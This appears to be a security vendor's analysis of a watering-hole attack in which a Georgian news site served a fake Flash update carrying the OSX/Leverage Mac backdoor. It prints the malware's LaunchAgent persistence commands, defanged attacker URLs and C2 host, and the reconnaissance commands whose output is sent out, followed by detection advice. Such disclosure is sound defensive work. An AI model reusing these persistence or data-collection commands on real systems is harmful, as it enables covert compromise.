			<p>Volexity recently identified a breach to the website of a well regarded media outlet in the country of Georgia. As part of this breach, the media organization&#8217;s website was being leveraged as a component of a malware campaign targeting select visitors. The news organization provides reporting on its website in English, Georgian, and Russian. However, only the Georgian language portion of the website was impacted and used in an effort to distribute malware. The targets were then further narrowed to those that were running the <span><strong>Mac OS X</strong> </span>operating system, had not previously visited the website, and had specific browser versions. The attackers accomplished much of this with JavaScript they placed on the media organization&#8217;s website.</p>
<p>The following JavaScript code was observed on the index page of the Georgian language portion of the website.</p>
<p><img class="aligncenter wp-image-805" src="https://www.volexity.com/wp-content/uploads/2017/07/ge-javascript-1024x554.png" alt="" width="656" height="355" /></p>
<p>The attackers appear to have implemented multiple checks to make sure they limited the targeting and frequency of the attacks against visitors to the website. In particular, the JavaScript specifically checks if the vistor&#8217;s User-Agent is associated with a Mac and that the browser is not Google Chrome. If these conditions pass, cookies for the website are pulled into a variable and inspected. In particular a cookie named <strong>site</strong> is examined to see if it holds the value <strong>RNDsstr2Template2</strong> or <strong>RNDsstrTemplate</strong>. If either cookie is present, it indicates that the visitor has previously visited the website and evaluated the attacker&#8217;s JavaScript code. If this is the case, the exploitation chain will end. The code will then extend the expiration of the <strong>site</strong> cookie with  <strong>RNDsstr2Template2 </strong>as its value. However, if initial criteria passed and the <strong>site</strong> cookie is not present or at least does not contain the value <strong>RNDsstr2Template2</strong> or <strong>RNDsstrTemplate</strong>, the JavaScript will then create the <strong>site </strong>cookie with the value <strong>RNDsstrTemplate</strong> and then call the function <strong>prepareFrame()</strong>.</p>
<p>The <strong>prepareFrame()</strong> function effectively loads an iframe from the following attacker controlled URL:</p>
<blockquote><p><span class="end-tag"><a class="unlinked">http://updatesec.webredirect[.]org/flash/index.php</a></span></p></blockquote>
<p>During most of Volexity&#8217;s test cases, this page will only return 2 bytes back to the request. However, when requesting the URL with a User-Agent indicative of a Mac system using Safari, Volexity was able to intermittently get the the website to return follow on JavaScript. Despite the initial check ensuring the visitor is on a Mac and not running Google Chrome, it appears server-side code performs further checks before attempting to actually target the user. Volexity observed the following code being returned from the server upon meeting all targeting conditions:</p>
<blockquote><p>&lt;script type=&#8217;text/javascript&#8217;&gt;</p>
<p>window.parent.location.href= &#8216;<a class="unlinked">http://updatesec.webredirect[.]org/flashplayer/index.html&#8217;;</a></p>
<p>&lt;/script&gt;</p></blockquote>
<p>This script results in the user being brought to a page titled &#8220;<strong>Flash Player Critical Update</strong>&#8221; that was designed to appear as though it was a legitimate Adobe website. This page in turn loaded an iframe from the following URL:</p>
<blockquote><p><span class="end-tag"><a class="unlinked">http://updatesec.webredirect[.]org/flash.html</a></span></p></blockquote>
<p>The code from this URL appears to have been generated from Metasploit with a module for the Safari User-Assisted Download and Run Attack. The <a class="jive-link-external-small" href="https://portal.volexity.com/external-link.jspa?url=https%3A%2F%2Fwww.rapid7.com%2Fdb%2Fmodules%2Fexploit%2Fosx%2Fbrowser%2Fsafari_user_assisted_download_launch" target="_blank" rel="nofollow noopener noreferrer">Metasploit website</a> describes the attack and the module as follows:</p>
<blockquote class="jive-quote"><p>This module abuses some Safari functionality to force the download of a zipped .app OSX application containing our payload. The app is then invoked using a custom URL scheme. At this point, the user is presented with Gatekeeper&#8217;s prompt: &#8220;APP_NAME&#8221; is an application downloaded from the internet. Are you sure you want to open it? If the user clicks &#8220;Open&#8221;, the app and its payload are executed. If the user has the &#8220;Only allow applications downloaded from Mac App Store and identified developers (on by default on OS 10.8+), the user will see an error dialog containing &#8220;can&#8217;t be opened because it is from an unidentified developer.&#8221; To work around this issue, you will need to manually build and sign an OSX app containing your payload with a custom URL handler called &#8220;openurl&#8221;. You can put newlines and unicode in your APP_NAME, although you must be careful not to create a prompt that is too tall, or the user will not be able to click the buttons, and will have to either logout or kill the CoreServicesUIAgent process.</p></blockquote>
<p>The code in this case would attempt to download and install malware from the following URL:</p>
<blockquote><p><span class="end-tag"><a class="unlinked">http://updatesec.webredirect[.]org/GetFlashPlayer.zip </a></span></p></blockquote>
<p>The User-Assisted Download and Run would then result in the creation of the file (directory) <strong>GetFlashPlayer.app</strong> and its attempted launch from the user&#8217;s Downloads directory. Per the description above, OS X will then prompt the user if they are sure they wish to run the file since it was downloaded from the Internet.</p>
<p><img class="aligncenter wp-image-822" src="https://www.volexity.com/wp-content/uploads/2017/07/GetFlashPlayer-autoexec.png" alt="GetFlashPlayer Execution" width="652" height="494" /><br />
If the user selects &#8220;Open&#8221; or otherwise later launches it from their Download folder, the malware will be launched and install a copy of itself at the following path:</p>
<blockquote class="jive-quote"><p><strong>/Users/&lt;username&gt;/Library/Safari/GetFlashPlayer.app/</strong></p></blockquote>
<p>The folder structure of the malware and its files is shown below.</p>
<p><img class="aligncenter wp-image-824" src="https://www.volexity.com/wp-content/uploads/2017/07/GetFlashPlayer-Folders.png" alt="OSX/Leverage Folder Structure" width="687" height="268" /></p>
<p>The malware maintains persistence through a Launch Agent by executing the following commands:</p>
<blockquote class="jive-quote"><p><strong>mkdir ~/Library/LaunchAgents</strong></p>
<p><strong>echo &#8216;&lt;?xml version=&#8221;1.0&#8243; encoding=&#8221;UTF-8&#8243;?&gt;&lt;!DOCTYPE plist PUBLIC &#8220;-//Apple//DTD PLIST 1.0//EN&#8221; &#8220;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#8221;&gt;&lt;plist version=&#8221;1.0&#8243;&gt;&lt;dict&gt;&lt;key&gt;RunAtLoad&lt;/key&gt;&lt;true/&gt;&lt;key&gt;KeepAlive&lt;/key&gt;&lt;true/&gt;&lt;key&gt;Label&lt;/key&gt;&lt;string&gt;com.GetFlashPlayer&lt;/string&gt;&lt;key&gt;ProgramArguments&lt;/key&gt;&lt;array&gt;&lt;string&gt;/Users/&lt;username&gt;/Library/Safari/GetFlashPlayer.app/Contents/MacOS/GetFlashPlayer&lt;/string&gt;&lt;/array&gt;&lt;/dict&gt;&lt;/plist&gt;&#8217; &gt; ~/Library/LaunchAgents/com.GetFlashPlayer.plist</strong></p></blockquote>
<p>As can be seen, the malware is writing a plist file named <strong>com.GetFlashPlayer.plist</strong> into the victim user&#8217;s LaunchAgent directory.<br />
The<em> RunAtLoad</em> and <em>KeepAlive</em> keys ensure that the malware will gain persistence and keep running.</p>
<p>Upon execution, the malware will also use the <em>open</em> command to launch the URL https://get.adobe.com/flashplayer/ in a browser window. This new browser activity is meant to trick the user into thinking the Adobe Flash Update application is legitimate. The malware then immediately begins to beacon to <strong>downloadarchives.servehttp[.]com</strong> (213.200.14.138) on TCP port <strong>7777</strong>. If a successful connection is made, the output from the following commands is sent:</p>
<ol>
<li>logname</li>
<li>ioreg -l | grep &#8220;product-name&#8221; | awk -F&#8221; &#8216;{print $4}&#8217;</li>
<li>sw_vers | awk -F&#8217;:t&#8217; &#8216;{print $2}&#8217; | paste -d &#8216; &#8216; &#8211; &#8211; -;</li>
<li>sysctl -n hw.memsize | awk &#8216;{print $0/1073741824&#8243; GB RAM&#8221;}&#8217;;</li>
<li>df -hl | grep &#8216;disk0s2&#8217; | awk &#8216;{print $4&#8243;/&#8221;$2&#8243; free (&#8220;$5&#8243; used)&#8221;}&#8217;</li>
<li>ioreg -l | grep &#8220;IOPlatformSerialNumber&#8221; | awk -F&#8221; &#8216;{print $4}&#8217;</li>
</ol>

<p>The backdoor is very noisy and will attempt to communicate with the command and control server every second until a connection is established.</p>
<h2>Malware File Information</h2>
<p>The malware used by the attackers appears to be a newer version of what has previously been dubbed OSX/Leverage.A and described in public blogs by <a class="jive-link-external-small" href="https://portal.volexity.com/external-link.jspa?url=https%3A%2F%2Fwww.intego.com%2Fmac-security-blog%2Ftopic%2Fosxleverage-a%2F" target="_blank" rel="nofollow noopener noreferrer">Intego</a> and <a class="jive-link-external-small" href="https://portal.volexity.com/external-link.jspa?url=https%3A%2F%2Fwww.alienvault.com%2Fblogs%2Flabs-research%2Fosx-leveragea-analysis" target="_blank" rel="nofollow noopener noreferrer">AlienVault</a>. It is written in Real Basic and beacons back to the attackers once per second until a connection is established. Unlike the earlier version of the malware, this new version does not limit itself to a predefined set of commands and instead allows an unrestricted command shell capability back into an infected system. Details of the core malware files are provided below.</p>

<h3><span>Digitally Signed</span></h3>
<p>This instance of the OSX/Leverage backdoor had been signed with a code signing certificate that was issued to an Apple Developer. Additional notes of interest related to the compilation time of the malware and developer name associated with the codesigning certificate are shown below from the <strong>codesign</strong> utility:</p>

<h2>Detection</h2>
<p>Detection of the malware can be achieved both from the host and network level. On the host, systems can be examined for the presence of the <strong>GetFlashPlayer</strong> application and/or Launch Agency under a user&#8217;s profile. Additionally, any files found to be signed with the certificate described above should be considered to be malicious. At the network level, connections destined for TCP port 7777 should be scrutinized and examined, as this is a non-standard port for typical external communication. The following Emerging Threats rule, found under trojan.rules, will also detect the network beacons:</p>
<blockquote><p>2017525 &#8211; ET TROJAN OSX/Leverage.A Checkin</p></blockquote>
